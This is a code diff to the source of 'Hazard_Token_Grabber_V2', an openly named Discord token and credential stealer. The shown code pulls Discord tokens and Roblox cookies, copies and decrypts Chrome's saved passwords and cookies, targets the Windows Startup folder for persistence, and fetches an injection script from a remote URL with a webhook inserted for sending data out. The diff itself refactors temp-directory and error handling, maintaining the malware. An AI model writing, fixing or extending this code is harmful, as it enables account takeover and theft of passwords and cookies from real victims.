@@ -13,6 +13,7 @@ import subprocess
 from sys import argv
 from PIL import ImageGrab
 from base64 import b64decode
+from tempfile import mkdtemp
 from re import findall, match
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -75,20 +76,16 @@ class Hazard_Token_Grabber_V2(functions):
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.temp = os.getenv("temp")
+        self.dir = mkdtemp()
         self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-        self.dir = self.temp+"\\Hazard_Token_Grabber_V2"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
-
-        try:
-            os.mkdir(os.path.join(self.dir))
-        except Exception:
-            pass
 
         self.sep = os.sep
         self.tokens = []
         self.robloxcookies = []
+
+        os.makedirs(self.dir, exist_ok=True)
 
     def try_extract(func):
         def wrapper(*args, **kwargs):
@@ -164,7 +161,7 @@ class Hazard_Token_Grabber_V2(functions):
                                 try:
                                     os.makedirs(
                                         inj_path+'initiation', exist_ok=True)
-                                except (FileExistsError, PermissionError):
+                                except PermissionError:
                                     pass
                             f = httpx.get(self.config('injection_url')).text.replace(
                                 "%WEBHOOK%", self.webhook)
@@ -306,7 +303,7 @@ class Hazard_Token_Grabber_V2(functions):
         master_key = self.get_master_key(
             self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
-        login = self.temp+self.sep+"Loginvault1.db"
+        login = self.dir+self.sep+"Loginvault1.db"
 
         shutil.copy2(login_db, login)
         conn = sqlite3.connect(login)
@@ -332,7 +329,7 @@ class Hazard_Token_Grabber_V2(functions):
         master_key = self.get_master_key(
             self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
-        login = self.temp+self.sep+"Loginvault2.db"
+        login = self.dir+self.sep+"Loginvault2.db"
         shutil.copy2(login_db, login)
         conn = sqlite3.connect(login)
         cursor = conn.cursor()
@@ -432,10 +429,8 @@ class Hazard_Token_Grabber_V2(functions):
                 with open(path, "r", errors="ignore") as ff:
                     x = ff.read()
                     if not x:
-                        try:
-                            os.remove(path)
-                        except PermissionError:
-                            pass
+                        ff.close()
+                        os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
